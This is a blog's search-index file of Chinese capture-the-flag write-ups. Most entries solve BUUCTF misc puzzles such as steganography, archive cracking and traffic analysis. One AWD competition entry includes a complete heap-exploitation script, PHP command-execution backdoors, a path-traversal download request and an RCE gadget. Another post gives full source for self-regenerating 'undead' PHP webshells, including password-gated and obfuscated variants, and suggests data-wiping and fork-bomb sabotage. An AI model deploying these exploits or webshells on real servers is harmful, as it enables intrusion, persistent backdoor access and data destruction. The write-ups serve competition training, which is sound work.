<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【buuctf】misc-page1</title>
    <url>/posts/8d0c1d82/</url>
    <content><![CDATA[签到
flag{buu_ctf}

金三胖gif文件，使用stegsolve逐帧查看，分别在第21，51，79帧出现了三段flag，拼接起来

flag{he11ohongke}

二维码解压得到一张二维码，解码得到secret is here十六进制形式下观察发现50 4b 03 04，即压缩包的头
可以将后缀直接改为zip解压，这样可以不用先分离文件打开后发现需要密码，而压缩包中的文件名为4number.txt，这样就很明显了，是4位数字爆破
使用archpr爆破得到密码7639

flag{vjpw_wnoei}

你竟然赶我走在文件尾直接得到flag

flag{stego_is_s0_bor1ing}

N种方法解决解压得到一个KEY.exe，以文本形式查看，可以看到实际上是一个base64后的图片解码后得到一张二维码，扫码得到

flag{dca57f966e4e4e31fd5b15417da63269}

大白图片放入010 editor会报IHDR块CRC错误，大概率是高宽被修改了
修改成较大的值

flag{He1l0_d4_ba1}

基础破解根据提示进行四位数字暴力破解，得到密码2563解压后对内容base64解码

flag{70354300a5100ba78068805661b93a5c}

乌镇峰会种图文件尾

flag{97314e7864a8f62627b26f3f998c37f1}

文件中的秘密右键查看属性，flag在备注中

flag{870c5a72806115cb5439345d8b014396}

wireshark流量分析题根据提示找到管理员的密码
使用wireshark打开，因为是登陆网站的一段流量包，所以在过滤器中搜索http，然后找到登录的user.php，找到密码

flag{ffb7567a1d4f4abdffdb54e022f8facd}

LSB题目名为LSB，应为LSB隐写
用stegsolve打开，在red，Green，Blue的0通道中发发现一张png的数据
导出后是一张二维码，扫码得到flag

flag{1sb_i4_s0_Ea4y}

rar又是4位数字爆破，8795

flag{1773c5da790bd3caff38e3decd180eb7}

zip伪加密如题，修改压缩文件区的加密标志位，改为00

flag{Adm1N-B2G-kU-SZIP}

qr扫码得到flag

flag{878865ce73370a4ce607d21ca01b5e59}

被嗅探的流量追踪TCP数据流，发现上传了一张flag.jpg，在图片数据尾发现flag

flag{da73d88936010da1eeeb36e945ec4b97}

镜子里面的世界stegsolve发现0通道中有异常数据，提取出来发现一串字符串Hey I think we can write  safely in this  file without any one seeing it. Any way, the secret key is: st3g0_saurus_wr3cks

flag{st3g0_saurus_wr3cks}

ningenforemost分离出一个zip，根据提示进行四位数爆破，8368

flag{b025fc9ca797a67d2103bfbc407a6d5f}

小明的保险箱foremost分离出一个rar，根据提示进行四位数爆破，7869

flag{75a3d68bf071ee188c418ea6cf0bb043}

爱因斯坦foremost分离出一个zip，密码在图片属性中this_is_not_password

flag{dd22a92bf2cceb6c0cd0d6b83ff51606}

easycap追踪TCP流

flag{385b87afc8671dee07550290d16a8071}

隐藏的钥匙strings得到flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)

flag{377cbadda1eca2f2f73d36277781f00a}

另外一个世界将文件尾的01101011 01101111 01100101 01101011 01101010 00110011 01110011转成字符串

flag{koekj3s}

FLAG使用stegsolve在0通道中发现zip数据提取后会发现提示文件已损坏，将结尾处没用的数据删除就可以了解压得到一个ELF文件，运行得到flag

flag{dd0gf4c3tok3yb0ard4g41n~~~}

假如给我三天光明图片下有盲文，百度找个盲文表对一下，得到kmdonowg使用audacity分析音频，发现摩斯-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..
解摩斯得到flag

flag{wpei08732?23dz}

神秘龙卷风四位数字爆破，5463得到一串brainfuck字符串解码得到flag

flag{e4bbef8bdf9743f8bf5b727a9f6332a8}

后门查杀用河马查杀，D盾或者手动查看找到include\include.php

flag{6ac45fb83b3bc355c024f5034b947dd3}

数据包中的线索过滤器筛选HTTP包，发现一段base64加密后的数据，解密后是一张jpg

flag{209acebf6324a09671abc31c869de72c}

荷兰宽带数据泄露路由器配置文件使用RouterPassView打开，搜索useranme

flag{053700357621}

来首歌吧audacity分析音频，发现左声道有摩斯
..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. 

flag{5BC925649CB0188F52E617D70929191C}

webshell后门D盾查杀，发现member\zp.php

flag{ba8e6c6f35a53933b871480bb9a9545c}

面具下的flagforemost分离出一个zip，伪加密，将加密标志位改为00，得到一个vmdk文件，但是这个文件很小，只有3MB，所以不太可能需要挂载
kail下使用7z解压7z x flag.vmdk -o/root/flag，得到key_part_one和key_part_two
分别进行brainfuck和ook解码

flag{N7F5_AD5_i5_funny!}

九连环foremost分离出一个zip，伪加密，将加密标志位改为00，得到一张jpg，使用steghide空密码解密，得到密码bV1g6t5wZDJif^J7，解压压缩包得到flag

flag{1RTo8w@&amp;4nK@z*XL}

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2024宁波市第七届网络安全大赛决赛 awd wp</title>
    <url>/posts/20b347fd/</url>
    <content><![CDATA[pwn攻击
from pwn import *context.arch=&#x27;amd64&#x27;import sysdef add(ind,size,data=b&#x27;\n&#x27;):    p.sendlineafter(b&#x27;edit&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;size&#x27;,str(size).encode())    p.sendlineafter(b&#x27;index&#x27;,str(ind).encode())    p.sendafter(b&#x27;content&#x27;,data)def free(ind):    p.sendlineafter(b&#x27;edit&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;index&#x27;,str(ind).encode())def show(ind):    p.sendlineafter(b&#x27;edit&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;index\n&#x27;,str(ind).encode())def edit(ind,data):    p.sendlineafter(b&#x27;edit&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;index&#x27;,str(ind).encode())    p.sendafter(b&#x27;content&#x27;,data)p=remote(sys.argv[1],sys.argv[2],timeout=2)#p=process(&quot;./pwn&quot;)libc=ELF(&quot;./libc-2.27.so&quot;)p.sendlineafter(b&#x27;name&#x27;,b&#x27;rotwill&#x27;)#gdb.attach(p,&#x27;b mprotect\nc&#x27;)add(0,0x500)add(1,0x50)add(2,0x50)add(3,0x50)free(0)show(0)d=u64(p.read(6).ljust(8,b&#x27;\x00&#x27;))libc.address=d-0x60-0x10-libc.sym[&#x27;__malloc_hook&#x27;]free_hook=libc.sym[&#x27;__free_hook&#x27;]setcontext=libc.address+0x52085mprotect=libc.sym[&#x27;mprotect&#x27;]free(1)free(2)show(2)d=u64(p.read(6).ljust(8,b&#x27;\x00&#x27;))chunk1=dedit(2,p64(free_hook))chunk6=chunk1-0x500-0x10payload=flat(&#123;    0:chunk6+0x100,    0x68: chunk6&amp;(~0xfff),    0x70: 0x1000,    0x88: 0x7,    0xa0:chunk6,    0xa8: mprotect    &#125;,filler=b&#x27;\x00&#x27;)payload=payload.ljust(0x100,b&#x27;\x00&#x27;)shellcode=shellcraft.open(&#x27;flag&#x27;)+shellcraft.read(3,chunk6,0x40)+\            shellcraft.write(1,chunk6,0x40)payload+=asm(shellcode)add(6,0x500,payload)add(4,0x50)add(5,0x50,p64(setcontext))free(6)p.readuntil(b&quot;flag&#123;&quot;)print(b&#x27;flag&#123;&#x27;+p.readuntil(b&#x27;&#125;&#x27;))p.close()

修复

将触发free函数的操作改为清空对应chunk指针即可
然后导出替换
cat /tmp/pwn1 &gt; /home/ctf/pwn
web漏洞1-默认后门用D盾直接扫可以扫到两个默认后门

public/test.php
&lt;?php if(isset($_REQUEST[&quot;cmd&quot;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&quot;cmd&quot;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;


修复
直接删掉
漏洞2-默认后门public/upload/other/20240513/hack.php
&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;


修复
直接删掉
漏洞3-任意文件上传public/hint.txt得到管理员账号密码
测试账号账号:ADMIN1密码:mypassword

通过.env可知后台地址映射为oka_admin

登录后台后发现在上传头像处没有过滤，可以直接上传

可惜这个点不是未授权，批量利用比较麻烦
修复
1：修改密码，后台没找到修改密码的地方，需要进入数据库修改
2：增加白名单
app/admin/controller/File.php
/** * 支持上传大文件 */public function upload()&#123;    $input        = input(&#x27;post.&#x27;);    $uploadPath   = public_path().&#x27;upload/&#x27;;    $uploadFile   = $this-&gt;request-&gt;file(&#x27;file&#x27;);    $originalName = $uploadFile-&gt;getOriginalName();    $originalType = FileAddons::getType(config(&#x27;upload.ext&#x27;),  $originalName);    $chunkId      = empty($input[&#x27;id&#x27;]) ? md5(sha1_file($uploadFile).$input[&#x27;size&#x27;]) : $input[&#x27;id&#x27;];    $chunkIndex   = $input[&#x27;index&#x27;];    $chunkCount   = $input[&#x27;count&#x27;];    $chunkPath    = &#x27;chunk/&#x27;.$chunkId.&#x27;/&#x27;;    // 增加的代码    $extension = strtolower($uploadFile-&gt;getOriginalExtension());    $allowedExtensions = [&#x27;jpg&#x27;, &#x27;jpeg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;];    if (!in_array($extension, $allowedExtensions)) &#123;        throw new ValidateException(&#x27;只允许上传图片文件&#x27;);    &#125;    if (empty($originalType)) &#123;        return json([&#x27;status&#x27; =&gt; &#x27;error&#x27;, &#x27;message&#x27; =&gt; &#x27;类型不支持，在常规管理中可配置！&#x27;]);    &#125;    try &#123;        validate([ &#x27;file&#x27; =&gt; [&#x27;fileSize&#x27; =&gt; config(&#x27;upload.size&#x27;)[$originalType], &#x27;fileExt&#x27; =&gt; config(&#x27;upload.ext&#x27;)[$originalType]] ])-&gt;check([&#x27;file&#x27; =&gt; $uploadFile]);    &#125; catch (ValidateException $e) &#123;        return json([&#x27;status&#x27; =&gt; &#x27;error&#x27;, &#x27;message&#x27; =&gt; $e-&gt;getMessage()]);    &#125;    // 断点续传    if ($chunkIndex == 1) &#123;        if (is_dir($uploadPath . $chunkPath)) &#123;           $oldChunkIndex = count(scandir($uploadPath . $chunkPath)) - 3;            if ($oldChunkIndex &gt; 1) &#123;                return json([&#x27;status&#x27; =&gt; &#x27;success&#x27;, &#x27;message&#x27; =&gt; &#x27;断点续传&#x27;, &#x27;index&#x27; =&gt; $oldChunkIndex, &#x27;id&#x27; =&gt; $chunkId]);            &#125;        &#125;    &#125;    // 分片写入    Filesystem::disk(&#x27;public&#x27;)-&gt;putFileAs($chunkPath, $uploadFile, $chunkIndex . &#x27;.tmp&#x27;);    if ($chunkIndex &lt; $chunkCount) &#123;        return json([&#x27;status&#x27; =&gt; &#x27;success&#x27;, &#x27;message&#x27; =&gt; &#x27;分片上传&#x27;, &#x27;index&#x27; =&gt; $chunkIndex, &#x27;id&#x27; =&gt; $chunkId]);    &#125;    // 分片检查    for ($i = 1; $i &lt;= $chunkCount; $i++) &#123;        if (! file_exists($uploadPath . $chunkPath . $i . &#x27;.tmp&#x27;)) &#123;            return json([&#x27;status&#x27; =&gt; &#x27;error&#x27;, &#x27;message&#x27; =&gt; &#x27;文件损坏，请重新上传&#x27;]);         &#125;    &#125;    // 分片合并    $filePath = $uploadPath . $originalType . &#x27;/&#x27; . date(&#x27;Ymd&#x27;)  . &#x27;/&#x27;;    if (! is_dir($filePath)) &#123;        mkdir($filePath, 0777, true);    &#125;    $fileExt   = $uploadFile-&gt;getOriginalExtension() ? $uploadFile-&gt;getOriginalExtension() : substr(strrchr($originalName, &#x27;.&#x27;), 1);    $fileName  = md5(microtime(true) . $originalName) . &#x27;.&#x27; . $fileExt;    $fileWrite = @fopen($filePath . $fileName, &quot;wb&quot;);    if (flock($fileWrite, LOCK_EX)) &#123;        for ($i = 1; $i &lt;= $chunkCount; $i++) &#123;            $uploadFile = $uploadPath . $chunkPath . $i . &#x27;.tmp&#x27;;            if (!$handle = @fopen($uploadFile, &quot;rb&quot;)) &#123;                break;            &#125;            while ($buff = fread($handle, filesize($uploadFile))) &#123;                fwrite($fileWrite, $buff);            &#125;            @fclose($handle);            @unlink($uploadFile); //删除分片        &#125;        flock($fileWrite, LOCK_UN);    &#125;    @fclose($fileWrite);    // 存入数据库    $save = FileModel::create([        &#x27;title&#x27;       =&gt; $originalName,        &#x27;type&#x27;        =&gt; $originalType,        &#x27;size&#x27;        =&gt; $input[&#x27;size&#x27;],        &#x27;url&#x27;         =&gt; str_replace(public_path(), &#x27;/&#x27;, $filePath . $fileName),        &#x27;status&#x27;      =&gt; 1,        &#x27;theme&#x27;       =&gt; theme(),        &#x27;create_time&#x27; =&gt; $input[&#x27;create_time&#x27;],    ]);    // 图片处理    if ($originalType === &quot;image&quot; &amp;&amp; $fileExt != &#x27;ico&#x27; &amp;&amp; $fileExt != &#x27;gif&#x27;) &#123;        // 封面图片        thumbnail($save[&#x27;url&#x27;],100,100);        // 水印图片        $watermark = $this-&gt;request-&gt;watermark;        if (! empty($watermark)) &#123;            if ($watermark[&#x27;open&#x27;] === 1) &#123;                // 水印图片                $watermarkConfig = $this-&gt;request-&gt;watermark;                if (!empty($watermarkConfig)) &#123;                    if ($watermarkConfig[&#x27;open&#x27;] === 1) &#123;                        $file     = str_replace(&#x27;\/&#x27;, &#x27;/&#x27;, public_path() . $save-&gt;url);                        $image    = Image::open($file);                        $scale    = (int)$watermarkConfig[&#x27;scale&#x27;] / 100;                        $position = (int)$watermarkConfig[&#x27;position&#x27;];                        $opacity  = (int)$watermarkConfig[&#x27;opacity&#x27;];                        $height   = $image-&gt;height();                        $width    = $image-&gt;width();                         if ($watermarkConfig[&#x27;type&#x27;] === &#x27;image&#x27;) &#123;                            $water = public_path() . &#x27;upload/watermark.png&#x27;;                            if (is_file($water)) &#123;                                if ($watermarkConfig[&#x27;sizeType&#x27;] === &#x27;scale&#x27;) &#123;                                    // 按照比例                                    $thumb = Image::open($water);                                    $waterName  = pathinfo($save-&gt;url, PATHINFO_FILENAME);                                    $waterThumb = str_replace(&#x27;watermark&#x27;, &#x27;watermark_thumb&#x27;, $water);                                    $thumb-&gt;thumb($width*$scale, $height*$scale)-&gt;save($waterThumb);                                    $image-&gt;water($waterThumb, $position, $opacity)-&gt;save($file);                                    if (is_file($waterThumb)) &#123;                                        unlink($waterThumb);                                    &#125;                                &#125; else &#123;                                    // 按实际大小                                    $image-&gt;water($water, $position, $opacity)-&gt;save($file);                                &#125;                            &#125;                        &#125; else &#123;                            $opacity    = 127 - (127 * $opacity / 100);                            $dechex     = dechex($opacity);                            $fontColor  = $watermarkConfig[&#x27;fontColor&#x27;].$dechex;                            $fontSize   = $watermarkConfig[&#x27;sizeType&#x27;] === &#x27;scale&#x27; ? $scale * ($width/2) : $watermarkConfig[&#x27;fontSize&#x27;];                            $fontFamily = public_path() . $watermarkConfig[&#x27;fontFamily&#x27;];                            $image-&gt;text($watermarkConfig[&#x27;fontText&#x27;], $fontFamily, $fontSize, $fontColor, $position, 0, $watermarkConfig[&#x27;fontAngle&#x27;])-&gt;save($file);                        &#125;                    &#125;                &#125;            &#125;        &#125;    &#125;    // 上传结束钩子    event(&#x27;UploadEnd&#x27;, $save);    return json([&#x27;status&#x27; =&gt; &#x27;success&#x27;, &#x27;message&#x27; =&gt; &#x27;上传成功&#x27;, &#x27;data&#x27; =&gt; $save]);&#125;



漏洞4-任意文件读取在修漏洞3-任意文件上传的时候看到就在上传文件的代码的上面几行就是一个下载函数，没有任何过滤，可以直接利用
app/admin/controller/File.php
/** * 下载文件 */public function download()&#123;    $input = input();    return download(public_path() . $input[&#x27;url&#x27;], $input[&#x27;title&#x27;]);&#125;

/oka_admin/file/download?url=../../../../../../flag&amp;title=1.txt

修复
/** * 下载文件 */public function download()&#123;    $input = input();    $input = str_replace(&quot;flag&quot;,&quot;&quot;,$input);    $input = str_replace(&quot;../&quot;,&quot;&quot;,$input);    return download(public_path() . $input[&#x27;url&#x27;], $input[&#x27;title&#x27;]);&#125;

或者
/** * 下载文件 */public function download()&#123;    $input = input();    if(strpos($input[&#x27;url&#x27;],&#x27;flag&#x27;)!==false)&#123;        throw new Exception(&quot;No No&quot;);    &#125;    return download(public_path() . $input[&#x27;url&#x27;], $input[&#x27;title&#x27;]);&#125;


漏洞5-rce审计发现public/themes/template/404.html包含恶意代码
&lt;?phpif(isset($_GET[&#x27;a&#x27;], $_GET[&#x27;aa&#x27;], $_GET[&#x27;b&#x27;], $_GET[&#x27;bb&#x27;], $_GET[&#x27;c&#x27;])) &#123;  $a = $_GET[&#x27;a&#x27;];  $aa = $_GET[&#x27;aa&#x27;];  $b = $_GET[&#x27;b&#x27;];  $bb = $_GET[&#x27;bb&#x27;];  $c = $_GET[&#x27;c&#x27;];  ((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());&#125; else &#123;  echo &#x27;&#x27;;&#125;?&gt;


访问任意不存在的文件使得404.html被包含即可通过Error内置类进行rce

修复
直接删掉这段代码
其他1：web靶机从第二轮开始基本所有队伍都上了通防，基本全靠pwn拿分了（偶尔会有几个web重置可以拿分）2：网络环境很差，有的靶机访问特别慢3：大概第四第五轮开始ssh中断，一直到结束前四十分钟才恢复4：没与工作人员说明的情况下靶机被重置多次（好像很多队伍都被重置了。但是重置后ssh密码也被更改了，赛后才知道是123456）5：大量靶机没有flag（可能有队伍提权了，不过猜测大概率是因为ssh连不上导致写不进flag）6：flag提交的api接口有问题（例子：交了10个flag，全部显示flag错误，但是会加分）

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>宁波</tag>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】misc-page2</title>
    <url>/posts/14054c38/</url>
    <content><![CDATA[被劫持的神秘礼物过滤器筛选http流量，在index.php的post参数中找到账号和密码


flag{1d240aafe21a86afc11f38a45b541a49}

刷新过的图片根据题目名，锁定F5隐写
java Extract Misc.jpg
得到一个伪加密后的压缩包

flag{96efd0a2037d06f34199e921079778ee}

snakeforemost分离出一个压缩包，解压得到ciphey和keykey文件中的内容base64解密得到What is Nicki Minaj&#39;s favorite song that refers to snakes?百度搜索得到anaconda
serpent解密得到flag

flag{who_knew_serpent_cipher_existed}

[BJDCTF2020]认真你就输了一个xls文件，实际是个压缩包，将后缀改为zip解压在xl\charts下得到flag.txt

flag{M9eVfi2Pcs#‌‌‌‌‍‬}

[BJDCTF2020]藏藏藏foremost分离出一个压缩包，解压得到docx，里面有张二维码，扫码得到flag

flag{you are the best!}

被偷走的文件追踪流可以发现使用ftp的retr命令下载了一个flag.rar
转成原始数据后另存为
使用archpr爆破得到密码5790，解压得到flag.txt

flag{6fe99a5d03fb01f833ec3caa80358fa3}

[GXYCTF2019]佛系青年伪加密，得到佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸
佛曰解密得到flag

flag{w0_fo_ci_Be1}

[BJDCTF2020]你猜我是个啥下载得到一个zip，但是实际上是一个png
改成png后打开得到一个二维码，扫码得到flag祥婓涴,是假的flag，真的在png文件尾

flag{i_am_fl@g}

菜刀666http流量分析先在z2参数中提取出一张jpg，得到密码：Th1s_1s_p4sswd_!!!再从上传的数据包中提取出一个zip解压得到flag

flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}

秘密文件与被偷走的文件这题步骤一致

flag{d72e5a671aa50fa5f400e5d10eedeaa5}

梅花香之苦寒来图片尾发现一串十六进制字符，转成ascii码，发现全是(x,x)的形式猜测为坐标，使用gnuplot画图
注意坐标的格式为x[空格]x
扫码得到flag

flag{40fc0a979f759c8892f4dc045e28b820}

[BJDCTF2020]just_a_rar四位数暴力破解，口令2016解压得到一张jpg，在属性中得到flag

flag{Wadf_123}

[BJDCTF2020]鸡你太美解压后得到两个gif文件，一个gif文件头被修改了修复后可以直接看到flag了注意不是短杠是下划线

flag{zhi_yin_you_are_beautiful}

[BJDCTF2020]一叶障目修改高度

flag{66666}

[SWPU2019]神奇的二维码binwalk分离出四个压缩包,有俩个无用的干扰项在其中一个doc中得到解压密码comEON_YOuAreSOSoS0great解压后是一个good.mp3，audacity分析发现摩斯
-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--

flag{morseisveryveryeasy}

[BJDCTF2020]纳尼修复文件头，再将每一帧分离出图片，拼接字符串后base64解密得到flag

flag{wang_bao_qiang_is_sad}

穿越时空的思念还是摩斯
第一段：F029BD6F551139EEDEB8E45A175B0786第二段：F029BD6F5

flag{f029bd6f551139eedeb8e45a175b0786}

[ACTF新生赛2020]outguessoutguess隐写密码在图片属性中outguess -r mmm.jpg -t asd -k abc

flag{gue33_Gu3Ss!2020}

[HBNIS2018]excel破解看似爆破，实际string

flag{office_easy_cracked}

谁赢了比赛？binwalk分解出一个rar暴力破解出密码1020将的得到的gif放在stegsolve分析在第310帧处发现不一样的图片,另存为再将这个图片进行lsb隐写分析在r0通道发现一张二维码扫码得到flag

flag{shanxiajingwu_won_the_game}

[SWPU2019]我有一只马里奥运行exe后生成了一段txt文本
ntfsflag.txt

很明显是ntfs流
使用ntfsstreamseditor处理

也可以使用notepad命令来打开隐藏的文件notepad 1.txt:flag.txt


flag{ddg_is_cute}

[HBNIS2018]来题中等的吧摩斯.- .-.. .--. .... .- .-.. .- -...

flag{alphalab}

[GXYCTF2019]gakkibinwalk分离出一个带密码的rar爆破出密码为8864
观察字符串的特征，不像各种编码，尝试词频分析
#python2from collections import Counterf=open(&#x27;file.txt&#x27;,&#x27;r&#x27;)f_read=f.read()print Counter(f_read)a=sorted(Counter(f_read).items(),key=lambda d:d[1],reverse=1)print &#x27;&#x27;.join([i[0] for i in a])


flag{gaki_IsMyw1fe}

[WUSTCTF2020]find_me图片属性备注中有盲文解密得到flag

flag{y$0$u_f$1$n$d$_M$e$e$e$e$e}

[ACTF新生赛2020]base64隐写base64隐写
# -*- coding: utf-8 -*-#base64解码脚本，Python2 运行b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;# 2.txt为需要解码的文件with open(&#x27;2.txt&#x27;, &#x27;rb&#x27;) as f:    bin_str = &#x27;&#x27;    for line in f.readlines():        stegb64 = &#x27;&#x27;.join(line.split())        rowb64 =  &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split())        offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1]))        equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组



flag{6aseb4_f33!}

[SWPU2019]伟大的侦探修改txt中内容的编码为EBCDIC得到密码wllm_is_the_best_team!
对着跳舞小人密码表解密得到flag

flag{iloveholmesandwllm}

[GUET-CTF2019]KOook编码

flag{welcome to CTF}

黑客帝国开头是52 61 72 21 1a 07 00，是rar的文件头，保存为rar暴力破解得到密码3690
解压得到一个后缀为png的文件，但是在十六进制下观察可以发现实际上是jpg文件，头前四个字节被修改成89 50 4e 47了。改成ff d8 ff e0即可
flag在修好后的图片上

flag{57cd4cfd4e07505b98048ca106132125}

[MRCTF2020]ezmisc修改高度

flag{1ts_vEryyyyyy_ez!}

[MRCTF2020]你能看懂音符吗文件头被改，修改回正确的52 61 72解压得到一个docx，改后缀为zip并解压
在document.xml中得到字符串♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=
音符解码得到flag

flag{thEse_n0tes_ArE_am@zing~}

sqltestsql注入的流量
先用tshark把注入流量导出来
tshark -r sqltest.pcapng -Y &quot;http.request&quot; -T fields -e http.request.full_uri &gt; data.txt

-r 读取文件-Y 过滤语句-T pdml|ps|text|fields|psml,设置解码结果输出的格式-e 输出特定字段http.request.uri http请求的uri部分

提取字段的ascii值，再把ascii转成字符串

102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125


flag{47edb8300ed5f9b28fc54b0d09ecdef7}

[HBNIS2018]低个头键盘密码，在键盘上画出来即可

flag{CTF}

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>AWD不死马与克制方法</title>
    <url>/posts/46ef80a/</url>
    <content><![CDATA[不死马一个典型的不死马：
&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#x27;.l.php&#x27;;    $code = &#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;;    //pass=lewiserii    while (1)&#123;        file_put_contents($file,$code);        system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;);        usleep(1000);    &#125;?&gt;
解释一下ignore_user_abort(true); 忽略与用户的断开，即使与客户机断开脚本仍会执行。set_time_limit(0); 设置脚本最大执行时间，这里设置为0，即没有时间方面的限制unlink(__FILE__); 删除文件本身，以起到隐蔽自身的作用
当上传完后需要访问一次不死马，生成一句话木马, 才能真正”不死”，这点很多新手第一次用可能会忽略，还有记得删除注释，不然就会被其他队乌鸦坐飞机

克制方法当然，不死马也并非真正无敌，只是在低权限的情况下较难处理
高权限下的处理方法（root）1：重启服务，杀掉不死马的进程ubuntu的用service，centos的用systemctl
低权限下的处理方法一般的awd比赛中基本不会放出root，所以我们的权限很低，无法进行重启服务等操作

不过办法总比困难多
方法一：kill进程
这个方法应该是目前最好的解决方案了，新建一个文件，比如del.php, 写上杀进程的命令，访问后即可删除不死马
www-data         //使用的时候注意用户不一定是www-data，根据实际情况来&lt;?phpsystem(&quot;kill `ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9`&quot;);php-fpm        //杀php-fpm进程&lt;?phpsystem(&quot;kill `ps -ef | grep php-fpm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27;`&quot;);php-apache     //杀httpd进程&lt;?phpsystem(&quot;kill `ps -ef | grep httpd | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27;`&quot;);


方法二：创建一个和不死马生成的马一样名字的目录对自己的防御不放心的话可以提前创建几个常用马名字的文件夹，比如m.php，shell.php
编写一个shell脚本
#!/bin/bashcd /var/www/html/while true;do rm -rf .l.php;mkdir .l.php;done
放在后台运行，实测不是很稳定，不推荐使用

方法三：竞争写入无意义的一句话usleep值比对方马的值低就行
&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#x27;.l.php&#x27;;    $code = &#x27;&lt;?php echo &quot;lewiserii&quot; ?&gt;&#x27;;    while (1)&#123;        file_put_contents($file,$code);        //system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;);        //usleep(1000);        usleep(0);    &#125;?&gt;


变种不死马与搅屎棍唯一的区别是文件名前加了个短杠，这就很骚了，会与命令的参数冲突而无法对它操作，但是浏览器中却可以正常解析
&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#x27;-index.php&#x27;;    $code = &#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;;    //pass=lewiserii    while (1)&#123;        file_put_contents($file,$code);        //system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; -index.php&#x27;);        usleep(0);    &#125;?&gt;


这个应该算是比较冷门的知识点了，想要操作也很简单，在文件前加上两个--就可以了，表示转义字符，或者形如./-index.php

搅屎棍：在不死马中添加rm -rf /var/www/html/*；或者创建大量无意义的文件；或者制作fork炸弹等等

动态密码php获取SERVER_ADDR的值进行md5
&lt;?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = &#x27;-lewiserii.php&#x27;;$ip = $_SERVER[&#x27;SERVER_ADDR&#x27;];$pass = md5($ip);$code = &#x27;&lt;?php if(md5($_REQUEST[&quot;pass&quot;])==&quot;&#x27; . $pass . &#x27;&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;;while (1)&#123;    file_put_contents($file,$code);    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; ./-lewiserii.php&#x27;);    usleep(500);&#125;?&gt;

但是也有缺点，因为密码是明文传输，很容易反应过来然后上车其实更好的方式是利用python等脚本在本地加密完再传到靶机
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>总结</tag>
        <tag>不死马</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】misc-page3</title>
    <url>/posts/63027cae/</url>
    <content><![CDATA[[HBNIS2018]caesar凯撒加密，枚举一下得到flag

flag{flagiscaesar}

[SWPU2019]你有没有好好看网课?解压得到flag2.zip和flag3.zipflag3.zip的注释中提示了6位数字爆破，183792得到flag.docx和影 流 之 主.mp4
